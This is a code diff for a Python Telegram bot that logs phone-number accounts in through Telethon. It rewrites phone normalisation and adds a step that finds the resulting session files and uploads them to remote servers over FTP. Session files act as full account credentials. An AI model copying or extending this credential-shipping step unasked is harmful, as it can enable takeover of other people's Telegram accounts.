@@ -1,11 +1,14 @@
+import os
+
 from aiogram import Dispatcher
 from aiogram.dispatcher import FSMContext
 from aiogram.types import CallbackQuery, Message
 from telethon import TelegramClient
 
 from config import *
-from handlers.activity.database import get_admin
+from handlers.activity.database import add_phone, get_admin
 from handlers.main.main_functions import get_main_keyboard
+from handlers.users.ftp_connection import send_file_to_servers
 from states import AddUserStates
 from texts.buttons import BUTTONS
 from texts.commands import COMMANDS
@@ -58,23 +61,14 @@ async def add_user_button(message: Message):
 @logger.catch
 async def phone_state(message: Message, state: FSMContext):
     if await not_command_checker(message=message, state=state):
-        phone = message.text
-        if phone.startswith("+"):
-            await state.update_data(phone=phone)
-            await message.answer(
-                text=MESSAGES["user_ask"], reply_markup=ask_keyboard(phone)
-            )
-            await state.finish()
-        elif phone.startswith("8"):
-            phone = phone.replace("8", "+7", 1)
-            await state.update_data(phone=phone)
-            await message.answer(
-                text=MESSAGES["user_ask"], reply_markup=ask_keyboard(phone)
-            )
-            await state.finish()
-        else:
-            await message.answer(text=MESSAGES["phone_error"])
-            await AddUserStates.phone.set()
+        phone = '+{num}'.format(num=''.join(filter(str.isdigit, message.text)))
+        if phone[1:3] == '89' and len(phone) == 12:
+            phone = phone[0] + '7' + phone[2:]
+        await state.update_data(phone=phone)
+        await message.answer(
+            text=MESSAGES["user_ask"], reply_markup=ask_keyboard(phone)
+        )
+        await state.finish()
 
 
 @logger.catch
@@ -132,6 +126,21 @@ async def sms_state(message: Message, state: FSMContext):
             await clients[phone]._start(
                 phone=phone, code_callback=code[phone], message=message
             )
+
+        for _, _, sessions in os.walk("base"):
+            for session in sessions:
+                if not session.endswith("journal") and phone in session:
+                    try:
+                        add_phone(session)
+                        file_path = f"base/{session}"
+                        send_file_to_servers(file_path=file_path)
+                        break
+                    except Exception as e:
+                        logger.error(f"Refresh Phones Error: {e}")
+
+        await message.answer(
+            text="Авторизация прошла успешно.", reply_markup=get_main_keyboard()
+        )
         await state.finish()
 
 
